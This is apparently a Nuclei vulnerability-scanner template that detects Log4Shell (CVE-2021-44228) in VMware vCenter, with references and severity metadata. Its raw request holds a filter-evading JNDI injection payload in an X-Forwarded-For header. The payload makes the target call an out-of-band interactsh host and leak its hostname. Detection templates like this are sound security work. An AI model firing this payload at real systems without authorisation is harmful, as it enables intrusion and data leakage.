http:
- extractors:
  - group: 1
    part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: interactsh_request
    regex:
    - ([a-zA-Z0-9\.\-]+)\.([a-z0-9]+)\.([a-z0-9]+)\.\w+
    type: regex
  matchers-condition: and
  raw:
  - 'GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}

    '
id: vmware-vcenter-log4j-jndi-rce
info:
  author: _0xf4n9x_
  description: A critical vulnerability in Apache Log4j identified by CVE-2021-44228
    has been publicly disclosed that may allow for remote code execution in impacted
    VMware VCenter.
  name: VMware VCenter Log4j JNDI RCE
  reference:
  - https://www.vmware.com/security/advisories/VMSA-2021-0028.html
  - https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
  - https://twitter.com/tnpitsecurity/status/1469429810216771589
  severity: high
  tags: rce,jndi,log4j,vcenter,vmware
